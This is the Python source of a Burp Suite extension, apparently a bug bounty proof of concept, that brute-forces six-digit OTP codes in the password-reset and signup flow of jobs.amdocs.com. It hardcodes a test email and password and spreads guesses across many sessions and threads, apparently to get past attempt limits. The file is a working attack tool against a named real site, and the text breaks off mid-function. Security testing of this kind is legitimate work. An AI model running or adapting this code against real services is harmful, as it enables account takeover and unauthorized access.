# -*- coding: utf-8 -*-
from burp import IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemHandler, ITab
from javax.swing import JMenuItem, JPanel, JButton, JLabel, JTextField, SwingConstants
from javax.swing import BoxLayout
from java.awt import FlowLayout
from java.awt.event import ActionListener
import re
import time
import json
import threading

class BurpExtender(IBurpExtender, IHttpListener, IContextMenuFactory, IMenuItemHandler, ITab, ActionListener):

    def registerExtenderCallbacks(self, callbacks):
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        callbacks.setExtensionName("OTP Brute Force")
        callbacks.registerHttpListener(self)
        callbacks.registerContextMenuFactory(self)
        self.stdout = callbacks.getStdout()
        
        # Initialize variables first
        self.is_running = False
        self.is_paused = False
        self.repeat_count = 1
        self.num_threads = 1
        
        # Create GUI before adding tab
        self.createGUI()
        
        # Add tab after GUI is created
        callbacks.addSuiteTab(self)

        # Variables to store cookies and CSRF token
        self.cookies = ""
        self.csrf_token = ""
        self.request_sequence = 0
        self.otp_start = 0
        self.otp_end = 999999
        self.email = "az3m+admin@bugcrowdninja.com"
        self.password = "Attackeroass@poc02"
        self.domain = "amdocs.com"
        self.is_running = False
        self.sessions = []  # Store multiple sessions
        self.num_sessions = 5  # Number of sessions to create
        self.otps_per_session = 2  # Number of OTPs to try per session
        self.delay_between_steps = 0.3  # Reduced delay between steps
        self.delay_between_sessions = 0.2  # Reduced delay between sessions
        self.delay_between_otps = 0.1  # Reduced delay between OTP attempts
        self.verbose_logging = False  # Set to True for detailed logs
        self.is_paused = False  # Pause flag
        self.repeat_count = 1  # Number of times to repeat the sequence
        self.otp_counter_lock = threading.Lock()  # Lock for thread-safe OTP counter
        self.global_otp_counter = self.otp_start  # Global OTP counter shared across threads
        self.flows_lock = threading.Lock()  # Lock for thread-safe flow storage
        self.all_flows = []  # Store all flows from all threads and iterations
        
        # Full referer URL
        self.referer = "https://jobs.amdocs.com/candidate/login?domain=amdocs.com&trackApplicationStatus=false&hl=en&next=http%3A%2F%2Fjobs.amdocs.com%2Fcareerhub%2Fme%3Faction%3Dedit%26trackApplicationStatus%3Dfalse%26hl%3Den%26profile_type%3Dcandidate%26domain%3Damdocs.com%26customredirect%3D1"
        
        self.log("OTP Brute Force Extension Loaded", force=True)
        self.log("Email: " + self.email, force=True)
        self.log("Use the 'OTP Brute Force' tab to start the attack", force=True)

    def log(self, message, force=False):
        """Safe logging method that works with Burp's stdout"""
        if not self.verbose_logging and not force:
            return
        try:
            self.stdout.write(message + "\n")
            self.stdout.flush()
        except:
            try:
                # Fallback: try using callbacks printOutput if available
                self.callbacks.printOutput(message)
            except:
                pass


    def createGUI(self):
        """Create the GUI panel"""
        self.mainPanel = JPanel()
        self.mainPanel.setLayout(BoxLayout(self.mainPanel, BoxLayout.Y_AXIS))
        
        # Title
        titleLabel = JLabel("OTP Brute Force Control")
        titleLabel.setAlignmentX(SwingConstants.CENTER)
        self.mainPanel.add(titleLabel)
        
        # Input fields panel
        inputPanel = JPanel(FlowLayout())
        inputPanel.add(JLabel("Repeat Count:"))
        self.repeatField = JTextField("1", 10)
        inputPanel.add(self.repeatField)
        
        inputPanel.add(JLabel("  Threads:"))
        self.threadsField = JTextField("1", 10)
        inputPanel.add(self.threadsField)
        self.mainPanel.add(inputPanel)
        
        # Start/Stop button
        buttonPanel = JPanel(FlowLayout())
        self.startButton = JButton("Start")
        self.startButton.addActionListener(self)
        buttonPanel.add(self.startButton)
        
        self.pauseButton = JButton("Pause")
        self.pauseButton.addActionListener(self)
        self.pauseButton.setEnabled(False)
        buttonPanel.add(self.pauseButton)
        
        self.mainPanel.add(buttonPanel)
        
        # Status label
        self.statusLabel = JLabel("Status: Ready")
        self.statusLabel.setAlignmentX(SwingConstants.CENTER)
        self.mainPanel.add(self.statusLabel)

    def getTabCaption(self):
        """Return the tab caption"""
        return "OTP Brute Force"

    def getUiComponent(self):
        """Return the UI component"""
        if not hasattr(self, 'mainPanel') or self.mainPanel is None:
            # Create GUI if not already created
            self.createGUI()
        return self.mainPanel

    def createMenuItems(self, contextMenuInvocation):
        """Create context menu items"""
        menuItems = []
        if self.is_paused:
            menuItem = JMenuItem("Resume OTP Brute Force")
        else:
            menuItem = JMenuItem("Pause OTP Brute Force")
        menuItem.addActionListener(self)
        menuItems.append(menuItem)
        return menuItems

    def actionPerformed(self, event):
        """Handle button/menu item click"""
        source = event.getSource()
        
        if source == self.startButton:
            if self.is_running:
                # Stop
                self.is_running = False
                self.startButton.setText("Start")
                self.pauseButton.setEnabled(False)
                self.statusLabel.setText("Status: Stopped")
                self.log("=== Stopped by user ===", force=True)
            else:
                # Start
                try:
                    repeat_count = int(self.repeatField.getText())
                    if repeat_count < 1:
                        repeat_count = 1
                    self.repeat_count = repeat_count
                    self.repeatField.setText(str(repeat_count))
                except:
                    self.repeat_count = 1
                    self.repeatField.setText("1")
                
                try:
                    num_threads = int(self.threadsField.getText())
                    if num_threads < 1:
                        num_threads = 1
                    if num_threads > 50:  # Limit to prevent too many threads
                        num_threads = 50
                    self.num_threads = num_threads
                    self.threadsField.setText(str(num_threads))
                except:
                    self.num_threads = 1
                    self.threadsField.setText("1")
                
                self.is_running = True
                self.is_paused = False
                # Reset global OTP counter and flows storage
                self.global_otp_counter = self.otp_start
                self.all_flows = []
                self.startButton.setText("Stop")
                self.pauseButton.setEnabled(True)
                self.statusLabel.setText("Status: Running (Repeat: " + str(self.repeat_count) + "x, Threads: " + str(self.num_threads) + ")")
                self.log("=== Starting with " + str(self.repeat_count) + " repetition(s) and " + str(self.num_threads) + " thread(s) ===", force=True)
                
                # Start execution in background thread
                thread = threading.Thread(target=self.execute_full_sequence)
                thread.daemon = True
                thread.start()
        
        elif source == self.pauseButton:
            self.is_paused = not self.is_paused
            if self.is_paused:
                self.pauseButton.setText("Resume")
                self.statusLabel.setText("Status: Paused")
                self.log("=== PAUSED ===", force=True)
            else:
                self.pauseButton.setText("Pause")
                self.statusLabel.setText("Status: Running")
                self.log("=== RESUMED ===", force=True)
        
        else:
            # Menu item
            self.is_paused = not self.is_paused
            if self.is_paused:
                self.pauseButton.setText("Resume")
                self.statusLabel.setText("Status: Paused")
                self.log("=== PAUSED - Click menu again to Resume ===", force=True)
            else:
                self.pauseButton.setText("Pause")
                self.statusLabel.setText("Status: Running")
                self.log("=== RESUMED - Continuing execution ===", force=True)

    def wait_if_paused(self):
        """Wait while paused"""
        while self.is_paused:
            time.sleep(0.1)

    def get_current_timestamp(self):
        """Generate current timestamp for X-Browser-Request-Time"""
        return str(time.time())

    def get_next_otps(self, count):
        """Thread-safe method to get next OTP codes"""
        with self.otp_counter_lock:
            otps = []
            for i in range(count):
                otp_code = self.global_otp_counter
                otps.append(otp_code)
                self.global_otp_counter += 1
            return otps

    def extract_cookies_from_response(self, response):
        """Extract all cookies from Set-Cookie headers"""
        if response is None:
            return ""
        
        cookies_list = []
        try:
            # Ensure response is bytes
            if not isinstance(response, (bytes, bytearray)):
                response = response.getResponse() if hasattr(response, 'getResponse') else response
            
            response_info = self.helpers.analyzeResponse(response)
            headers = response_info.getHeaders()
            
            for header in headers:
                if header.startswith("Set-Cookie:") or header.startswith("set-cookie:"):
                    cookie_line = header.split(":", 1)[1].strip()
                    # Extract cookie name and value (before semicolon)
                    cookie_parts = cookie_line.split(";")[0].strip()
                    if cookie_parts:
                        cookies_list.append(cookie_parts)
            
            # Also check for _vscid cookie - if _vs exists but _vscid doesn't, add it
            cookie_dict = {}
            for cookie in cookies_list:
                if "=" in cookie:
                    name, value = cookie.split("=", 1)
                    cookie_dict[name] = value
            
            # If we have _vs but not _vscid, add _vscid=0
            if "_vs" in cookie_dict and "_vscid" not in cookie_dict:
                cookies_list.append("_vscid=0")
        except Exception as e:
            self.log("Error extracting cookies: " + str(e))
        
        return "; ".join(cookies_list)

    def extract_csrf_token_from_headers(self, response):
        """Extract CSRF token from X-Csrf-Token response header"""
        if response is None:
            return None
        
        try:
            # Ensure response is bytes
            if not isinstance(response, (bytes, bytearray)):
                response = response.getResponse() if hasattr(response, 'getResponse') else response
            
            response_info = self.helpers.analyzeResponse(response)
            headers = response_info.getHeaders()
            
            for header in headers:
                if header.startswith("X-Csrf-Token:") or header.startswith("x-csrf-token:"):
                    token = header.split(":", 1)[1].strip()
                    return token
        except Exception as e:
            self.log("Error extracting CSRF from headers: " + str(e))
        
        return None

    def extract_csrf_token(self, response_str):
        """Extract CSRF token from response body"""
        # Try multiple patterns
        patterns = [
            r'"_csrf":"([^"]+)"',
            r'"csrf_token":"([^"]+)"',
            r'X-Csrf-Token["\s:]+([^\s"]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, response_str)
            if match:
                return match.group(1)
        return None

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        if messageIsRequest:
            return
        else:
            response = messageInfo.getResponse()
            if response is None:
                return
            response_str = self.helpers.bytesToString(response)

            # Extract cookies from Set-Cookie headers
            new_cookies = self.extract_cookies_from_response(response)
            if new_cookies:
                if self.cookies:
                    # Merge cookies
                    existing_cookies = set(cookie.split("=")[0] for cookie in self.cookies.split("; ") if "=" in cookie)
                    new_cookies_list = []
                    for cookie in new_cookies.split("; "):
                        if "=" in cookie and cookie.split("=")[0] not in existing_cookies:
                            new_cookies_list.append(cookie)
                    if new_cookies_list:
                        self.cookies = self.cookies + "; " + "; ".join(new_cookies_list)
                else:
                    self.cookies = new_cookies

            # Extract CSRF token
            csrf = self.extract_csrf_token(response_str)
            if csrf:
                self.csrf_token = csrf

            if self.cookies:
                self.log("Cookies: " + self.cookies)
            if self.csrf_token:
                self.log("CSRF Token: " + self.csrf_token)

    def send_initial_get_request(self):
        """Step 1: Initial GET request to fetch cookies"""
        headers = [
            "GET / HTTP/1.1",
            "Host: jobs.amdocs.com",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Upgrade-Insecure-Requests: 1",
            "Sec-Fetch-Dest: document",
            "Sec-Fetch-Mode: navigate",
            "Sec-Fetch-Site: none",
            "Sec-Fetch-User: ?1",
            "X-Pwnfox-Color: pink",
            "Priority: u=0, i",
            "Te: trailers",
            "Connection: keep-alive"
        ]
        return self.make_request(headers, "")

    def send_account_info_request(self):
        """Step 2: GET request with cookies to get CSRF token"""
        email_encoded = self.email.replace("@", "%40").replace("+", "%2B")
        
        # Ensure cookies include _vscid if _vs exists
        cookies_to_send = self.cookies
        if "_vs" in cookies_to_send and "_vscid" not in cookies_to_send:
            cookies_to_send = cookies_to_send + "; _vscid=0"
        
        headers = [
            "GET /api/career_signup/account_info?domain=" + self.domain + "&email=" + email_encoded + " HTTP/2",
            "Host: jobs.amdocs.com",
            "Cookie: " + cookies_to_send,
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
            "Accept: */*",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Referer: " + self.referer,
            "Content-Type: application/json",
            "X-Browser-Request-Time: " + self.get_current_timestamp(),
            "Sec-Fetch-Dest: empty",
            "Sec-Fetch-Mode: cors",
            "Sec-Fetch-Site: same-origin",
            "X-Pwnfox-Color: pink",
            "Priority: u=0",
            "Cache-Control: max-age=0",
            "Te: trailers"
        ]
        return self.make_request(headers, "")

    def send_stage_password_request(self):
        """Step 3: POST request to set password"""
        body_data = {
            "password": self.password,
            "domain": self.domain,
            "is_password_reset": True,
            "email": self.email
        }
        body = json.dumps(body_data)
        
        # Ensure cookies include _vscid if _vs exists
        cookies_to_send = self.cookies
        if "_vs" in cookies_to_send and "_vscid" not in cookies_to_send:
            cookies_to_send = cookies_to_send + "; _vscid=0"
        
        headers = [
            "POST /api/career_signup/stage_password HTTP/2",
            "Host: jobs.amdocs.com",
            "Cookie: " + cookies_to_send,
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Referer: " + self.referer,
            "Content-Type: application/json",
            "X-Csrf-Token: " + self.csrf_token,
            "X-Browser-Request-Time: " + self.get_current_timestamp(),
            "Content-Length: " + str(len(body)),
            "Origin: https://jobs.amdocs.com",
            "Sec-Fetch-Dest: empty",
            "Sec-Fetch-Mode: cors",
            "Sec-Fetch-Site: same-origin",
            "X-Pwnfox-Color: pink",
            "Priority: u=0",
            "Te: trailers"
        ]
        return self.make_request(headers, body)

    def send_otp_verification_request(self):
        """Step 4: Request to send OTP verification"""
        body_data = {
            "domain": self.domain,
            "next_url": "/careerhub",
            "instance_type": "candidate",
            "language": "en",
            "trigger": "",
            "microsite": "",
            "email": self.email
        }
        body = json.dumps(body_data)
        
        # Ensure cookies include _vscid if _vs exists
        cookies_to_send = self.cookies
        if "_vs" in cookies_to_send and "_vscid" not in cookies_to_send:
            cookies_to_send = cookies_to_send + "; _vscid=0"
        
        headers = [
            "POST /api/career_signup/send_otp_verification HTTP/2",
            "Host: jobs.amdocs.com",
            "Cookie: " + cookies_to_send,
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Referer: " + self.referer,
            "Content-Type: application/json",
            "X-Csrf-Token: " + self.csrf_token,
            "X-Browser-Request-Time: " + self.get_current_timestamp(),
            "Content-Length: " + str(len(body)),
            "Origin: https://jobs.amdocs.com",
            "Sec-Fetch-Dest: empty",
            "Sec-Fetch-Mode: cors",
            "Sec-Fetch-Site: same-origin",
            "X-Pwnfox-Color: pink",
            "Te: trailers"
        ]
        return self.make_request(headers, body)

    def send_confirm_otp_request(self, otp_code):
        """Step 5: Brute-force OTP confirmation"""
        next_url = "http://jobs.amdocs.com/careerhub/me?action=edit&trackApplicationStatus=false&hl=en&profile_type=candidate&domain=" + self.domain + "&customredirect=1"
        body_data = {
            "otp": str(otp_code).zfill(6),
            "domain": self.domain,
            "next": next_url,
            "email": self.email
        }
        body = json.dumps(body_data)
        
        # Ensure cookies include _vscid if _vs exists
        cookies_to_send = self.cookies
        if "_vs" in cookies_to_send and "_vscid" not in cookies_to_send:
            cookies_to_send = cookies_to_send + "; _vscid=0"
        
        headers = [
            "POST /api/career_signup/confirm_otp HTTP/2",
            "Host: jobs.amdocs.com",
            "Cookie: " + cookies_to_send,
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Referer: " + self.referer,
            "Content-Type: application/json",
            "X-Csrf-Token: " + self.csrf_token,
            "X-Browser-Request-Time: " + self.get_current_timestamp(),
            "Content-Length: " + str(len(body)),
            "Origin: https://jobs.amdocs.com",
            "Sec-Fetch-Dest: empty",
            "Sec-Fetch-Mode: cors",
            "Sec-Fetch-Site: same-origin",
            "X-Pwnfox-Color: pink",
            "Priority: u=0",
            "Te: trailers"
        ]
        return self.make_request(headers, body)


    def process_response(self, response):
        """Process response to extract cookies and CSRF token"""
        if response is None:
            return
        
        try:
            # Extract cookies
            new_cookies = self.extract_cookies_from_response(response)
            if new_cookies:
                # Build cookie dictionary for merging
                cookie_dict = {}
                
                # Add existing cookies
                if self.cookies:
                    for cookie in self.cookies.split("; "):
                        if "=" in cookie:
                            name, value = cookie.split("=", 1)
                            cookie_dict[name] = value
                
                # Add/update with new cookies
                for cookie in new_cookies.split("; "):
                    if "=" in cookie:
                        name, value = cookie.split("=", 1)
                        cookie_dict[name] = value
                
                # Ensure _vscid is present if _vs exists
                if "_vs" in cookie_dict and "_vscid" not in cookie_dict:
                    cookie_dict["_vscid"] = "0"
                
                # Rebuild cookie string
                self.cookies = "; ".join([name + "=" + value for name, value in cookie_dict.items()])
                
                if self.cookies:
                    self.log("Cookies updated: " + self.cookies)
            
            # Extract CSRF token from headers first (this is the primary source)
            csrf = self.extract_csrf_token_from_headers(response)
            if csrf:
                self.csrf_token = csrf
                self.log("CSRF Token from header: " + self.csrf_token)
            else:
                # Fallback: try to extract from body
                try:
                    response_str = self.helpers.bytesToString(response)
                    csrf = self.extract_csrf_token(response_str)
                    if csrf:
                        self.csrf_token = csrf
                        self.log("CSRF Token from body: " + self.csrf_token[:50] + "...")
                except:
                    pass
        except Exception as e:
            self.log("Error processing response: " + str(e))

    def execute_flow_steps_1_to_4(self, flow_id):
        """Execute Steps 1-4 only and return cookies/CSRF"""
        flow_cookies = ""
        flow_csrf = ""
        
        try:
            self.log("=== Flow " + str(flow_id) + ": Steps 1-4 ===", force=True)
            
            # Step 1: Initial GET to get cookies
            self.log("Flow " + str(flow_id) + " - Step 1: GET /", force=True)
            response = self.send_initial_get_request()
            if response:
                new_cookies = self.extract_cookies_from_response(response)
                if new_cookies:
                    cookie_dict = {}
                    for cookie in new_cookies.split("; "):
                        if "=" in cookie:
                            name, value = cookie.split("=", 1)
                            cookie_dict[name] = value
                    if "_vs" in cookie_dict and "_vscid" not in cookie_dict:
                        cookie_dict["_vscid"] = "0"
                    flow_cookies = "; ".join([name + "=" + value for name, value in cookie_dict.items()])
                    self.log("Flow " + str(flow_id) + " - Cookies obtained", force=True)
            self.wait_if_paused()
            time.sleep(self.delay_between_steps)
            
            if not flow_cookies:
                self.log("Flow " + str(flow_id) + " - ERROR: No cookies", force=True)
                return None
            
            # Step 2: GET account_info with cookies from Step 1, get CSRF
            self.log("Flow " + str(flow_id) + " - Step 2: GET /api/career_signup/account_info", force=True)
            email_encoded = self.email.replace("@", "%40").replace("+", "%2B")
            cookies_to_send = flow_cookies
            if "_vs" in cookies_to_send and "_vscid" not in cookies_to_send:
                cookies_to_send = cookies_to_send + "; _vscid=0"
            
            headers = [
                "GET /api/career_signup/account_info?domain=" + self.domain + "&email=" + email_encoded + " HTTP/2",
                "Host: jobs.amdocs.com",
                "Cookie: " + cookies_to_send,
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
                "Accept: */*",
                "Accept-Language: en-US,en;q=0.5",
                "Accept-Encoding: gzip, deflate, br",
                "Referer: " + self.referer,
                "Content-Type: application/json",
                "X-Browser-Request-Time: " + self.get_current_timestamp(),
                "Sec-Fetch-Dest: empty",
                "Sec-Fetch-Mode: cors",
                "Sec-Fetch-Site: same-origin",
                "X-Pwnfox-Color: pink",
                "Priority: u=0",
                "Cache-Control: max-age=0",
                "Te: trailers"
            ]
            response = self.make_request(headers, "")
            if response:
                flow_csrf = self.extract_csrf_token_from_headers(response)
                if not flow_csrf:
                    try:
                        response_str = self.helpers.bytesToString(response)
                        flow_csrf = self.extract_csrf_token(response_str)
                    except:
                        pass
                if flow_csrf:
                    self.log("Flow " + str(flow_id) + " - CSRF obtained", force=True)
            self.wait_if_paused()
            time.sleep(self.delay_between_steps)
            
            if not flow_csrf:
                self.log("Flow " + str(flow_id) + " - ERROR: No CSRF token", force=True)
                return None
            
            # Step 3: POST stage_password with cookies from Step 1 and CSRF from Step 2
            self.log("Flow " + str(flow_id) + " - Step 3: POST /api/career_signup/stage_password", force=True)
            body_data = {
                "password": self.password,
                "domain": self.domain,
                "is_password_reset": True,
                "email": self.email
            }
            body = json.dumps(body_data)
            cookies_to_send = flow_cookies
            if "_vs" in cookies_to_send and "_vscid" not in cookies_to_send:
                cookies_to_send = cookies_to_send + "; _vscid=0"
            
            headers = [
                "POST /api/career_signup/stage_password HTTP/2",
                "Host: jobs.amdocs.com",
                "Cookie: " + cookies_to_send,
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
                "Accept: application/json, text/plain, */*",
                "Accept-Language: en-US,en;q=0.5",
                "Accept-Encoding: gzip, deflate, br",
                "Referer: " + self.referer,
                "Content-Type: application/json",
                "X-Csrf-Token: " + flow_csrf,
                "X-Browser-Request-Time: " + self.get_current_timestamp(),
                "Content-Length: " + str(len(body)),
                "Origin: https://jobs.amdocs.com",
                "Sec-Fetch-Dest: empty",
                "Sec-Fetch-Mode: cors",
                "Sec-Fetch-Site: same-origin",
                "X-Pwnfox-Color: pink",
                "Priority: u=0",
                "Te: trailers"
            ]
            response = self.make_request(headers, body)
            if response:
                # Update CSRF if changed
                updated_csrf = self.extract_csrf_token_from_headers(response)
                if updated_csrf:
                    flow_csrf = updated_csrf
            self.wait_if_paused()
            time.sleep(self.delay_between_steps)
            
            # Step 4: POST send_otp_verification with cookies from Step 1 and CSRF from Step 3
            self.log("Flow " + str(flow_id) + " - Step 4: POST /api/career_signup/send_otp_verification", force=True)
            body_data = {
                "domain": self.domain,
                "next_url": "/careerhub",
                "instance_type": "candidate",
                "language": "en",
                "trigger": "",
                "microsite": "",
                "email": self.email
            }
            body = json.dumps(body_data)
            cookies_to_send = flow_cookies
            if "_vs" in cookies_to_send and "_vscid" not in cookies_to_send:
                cookies_to_send = cookies_to_send + "; _vscid=0"
            
            headers = [
                "POST /api/career_signup/send_otp_verification HTTP/2",
                "Host: jobs.amdocs.com",
                "Cookie: " + cookies_to_send,
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
                "Accept: application/json, text/plain, */*",
                "Accept-Language: en-US,en;q=0.5",
                "Accept-Encoding: gzip, deflate, br",
                "Referer: " + self.referer,
                "Content-Type: application/json",
                "X-Csrf-Token: " + flow_csrf,
                "X-Browser-Request-Time: " + self.get_current_timestamp(),
                "Content-Length: " + str(len(body)),
                "Origin: https://jobs.amdocs.com",
                "Sec-Fetch-Dest: empty",
                "Sec-Fetch-Mode: cors",
                "Sec-Fetch-Site: same-origin",
                "X-Pwnfox-Color: pink",
                "Te: trailers"
            ]
            response = self.make_request(headers, body)
            if response:
                # Update CSRF if changed
                updated_csrf = self.extract_csrf_token_from_headers(response)
                if updated_csrf:
                    flow_csrf = updated_csrf
            self.wait_if_paused()
            time.sleep(self.delay_between_steps)
            
            self.log("=== Flow " + str(flow_id) + ": Steps 1-4 completed ===", force=True)
            return {"cookies": flow_cookies, "csrf_token": flow_csrf, "flow_id": flow_id}
        except Exception as e:
            self.log("Error in flow " + str(flow_id) + ": " + str(e), force=True)
            return None

    def send_otp_confirmations_for_flow(self, flow_data, otp_codes):
        """Send Step 5 (OTP confirmations) for a flow using stored cookies/CSRF"""
        flow_id = flow_data["flow_id"]
        flow_cookies = flow_data["cookies"]
        flow_csrf = flow_data["csrf_token"]
        
        try:
            self.log("=== Flow " + str(flow_id) + ": Sending OTP confirmations ===", force=True)
            
            for otp_attempt, otp_code in enumerate(otp_codes):
                if not self.is_running:
                    break
                self.wait_if_paused()
                otp_str = str(otp_code).zfill(6)
                self.log("Flow " + str(flow_id) + " - Step 5 (" + str(otp_attempt + 1) + "/" + str(self.otps_per_session) + "): POST /api/career_signup/confirm_otp with OTP: " + otp_str, force=True)
                
                next_url = "http://jobs.amdocs.com/careerhub/me?action=edit&trackApplicationStatus=false&hl=en&profile_type=candidate&domain=" + self.domain + "&customredirect=1"
                body_data = {
                    "otp": otp_str,
                    "domain": self.domain,
                    "next": next_url,
                    "email": self.email
                }
                body = json.dumps(body_data)
                cookies_to_send = flow_cookies
                if "_vs" in cookies_to_send and "_vscid" not in cookies_to_send:
                    cookies_to_send = cookies_to_send + "; _vscid=0"
                
                headers = [
                    "POST /api/career_signup/confirm_otp HTTP/2",
                    "Host: jobs.amdocs.com",
                    "Cookie: " + cookies_to_send,
                    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
                    "Accept: application/json, text/plain, */*",
                    "Accept-Language: en-US,en;q=0.5",
                    "Accept-Encoding: gzip, deflate, br",
                    "Referer: " + self.referer,
                    "Content-Type: application/json",
                    "X-Csrf-Token: " + flow_csrf,
                    "X-Browser-Request-Time: " + self.get_current_timestamp(),
                    "Content-Length: " + str(len(body)),
                    "Origin: https://jobs.amdocs.com",
                    "Sec-Fetch-Dest: empty",
                    "Sec-Fetch-Mode: cors",
                    "Sec-Fetch-Site: same-origin",
                    "X-Pwnfox-Color: pink",
                    "Priority: u=0",
                    "Te: trailers"
                ]
                response = self.make_request(headers, body)
                if response:
                    try:
                        response_info = self.helpers.analyzeResponse(response)
                        status = response_info.getStatusCode()
                        if status == 200:
                            response_str = self.helpers.bytesToString(response)
                            if "success" in response_str.lower() or "verified" in response_str.lower():
                                if "error" not in response_str.lower() and "invalid" not in response_str.lower():
                                    self.log("*** SUCCESS! Flow " + str(flow_id) + " - OTP: " + otp_str + " ***", force=True)
                                    self.log("Response: " + response_str[:500], force=True)
                    except:
                        pass
                
                self.wait_if_paused()
                time.sleep(self.delay_between_otps)
        except Exception as e:
            self.log("Error sending OTPs for flow " + str(flow_id) + ": " + str(e), force=True)

    def send_otp_confirmation_for_session(self, session_data, otp_code):
        """Send OTP confirmation request for a specific session"""
        next_url = "http://jobs.amdocs.com/careerhub/me?action=edit&trackApplicationStatus=false&hl=en&profile_type=candidate&domain=" + self.domain + "&customredirect=1"
        body_data = {
            "otp": str(otp_code).zfill(6),
            "domain": self.domain,
            "next": next_url,
            "email": self.email
        }
        body = json.dumps(body_data)
        
        # Ensure cookies include _vscid if _vs exists
        cookies_to_send = session_data["cookies"]
        if "_vs" in cookies_to_send and "_vscid" not in cookies_to_send:
            cookies_to_send = cookies_to_send + "; _vscid=0"
        
        headers = [
            "POST /api/career_signup/confirm_otp HTTP/2",
            "Host: jobs.amdocs.com",
            "Cookie: " + cookies_to_send,
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Referer: " + self.referer,
            "Content-Type: application/json",
            "X-Csrf-Token: " + session_data["csrf_token"],
            "X-Browser-Request-Time: " + self.get_current_timestamp(),
            "Content-Length: " + str(len(body)),
            "Origin: https://jobs.amdocs.com",
            "Sec-Fetch-Dest: empty",
            "Sec-Fetch-Mode: cors",
            "Sec-Fetch-Site: same-origin",
            "X-Pwnfox-Color: pink",
            "Priority: u=0",
            "Te: trailers"
        ]
        return self.make_request(headers, body)

    def execute_phase1_for_iteration(self, repeat_num, total_repeats):
        """Execute Phase 1 (Steps 1-4) only for a single iteration - store flows"""
        try:
            self.log("=== Iteration " + str(repeat_num) + "/" + str(total_repeats) + ": Phase 1 - Executing Steps 1-4 for " + str(self.num_sessions) + " flows ===", force=True)
            
            # Execute Steps 1-4 for all flows in this iteration
            for flow_num in range(1, self.num_sessions + 1):
                if not self.is_running:
                    break
                self.wait_if_paused()
                
                flow_data = self.execute_flow_steps_1_to_4(flow_num)
                if flow_data:
                    # Add iteration number for tracking
                    flow_data["iteration"] = repeat_num
                    # Store flow data thread-safely
                    with self.flows_lock:
                        self.all_flows.append(flow_data)
                    self.log("Iteration " + str(repeat_num) + " - Flow " + str(flow_num) + " - Steps 1-4 completed, stored", force=True)
                else:
                    self.log("Iteration " + str(repeat_num) + " - Flow " + str(flow_num) + " - Failed Steps 1-4", force=True)
                
                self.wait_if_paused()
                time.sleep(self.delay_between_sessions)
            
            self.log("=== Iteration " + str(repeat_num) + " - Phase 1 completed ===", force=True)
        except Exception as e:
            self.log("Error in Phase 1 - Iteration " + str(repeat_num) + ": " + str(e), force=True)

    def execute_phase2_all_flows(self):
        """Execute Phase 2 (OTP confirmations) for all stored flows"""
        try:
            self.log("=== Phase 2: Sending OTP confirmations for ALL flows ===", force=True)
            self.log("Total flows to process: " + str(len(self.all_flows)), force=True)
            
            # Process all flows collected from all threads and iterations
            for flow_data in self.all_flows:
                if not self.is_running:
                    break
                self.wait_if_paused()
                
                # Get next OTPs thread-safely (ensures no duplicates)
                otp_codes = self.get_next_otps(self.otps_per_session)
                
                # Send OTP confirmations using this flow's cookies/CSRF
                self.send_otp_confirmations_for_flow(flow_data, otp_codes)
                
                self.wait_if_paused()
                time.sleep(self.delay_between_sessions)
            
            self.log("=== Phase 2: All OTP confirmations sent ===", force=True)
        except Exception as e:
            self.log("Error in Phase 2: " + str(e), force=True)

    def execute_full_sequence(self):
        """Execute the full request sequence: Phase 1 for all iterations, then Phase 2 once"""
        try:
            self.log("=== Starting execution: " + str(self.repeat_count) + " iteration(s) with " + str(self.num_threads) + " thread(s) ===", force=True)
            
            # PHASE 1: Execute Steps 1-4 for ALL iterations (with threads if > 1)
            if self.num_threads == 1:
                # Single thread - run Phase 1 sequentially
                for repeat_num in range(1, self.repeat_count + 1):
                    if not self.is_running:
                        break
                    self.statusLabel.setText("Status: Phase 1 (Iteration " + str(repeat_num) + "/" + str(self.repeat_count) + ")")
                    self.execute_phase1_for_iteration(repeat_num, self.repeat_count)
                    if repeat_num < self.repeat_count:
                        time.sleep(0.5)
            else:
                # Multiple threads - distribute iterations across threads for Phase 1
                threads = []
                iterations_per_thread = max(1, self.repeat_count // self.num_threads)
                remaining = self.repeat_count % self.num_threads
                
                iteration = 1
                for thread_id in range(self.num_threads):
                    if not self.is_running:
                        break
                    
                    # Calculate iterations for this thread
                    thread_iterations = iterations_per_thread
                    if thread_id < remaining:
                        thread_iterations += 1
                    
                    if thread_iterations == 0:
                        break
                    
                    # Create thread for Phase 1 only
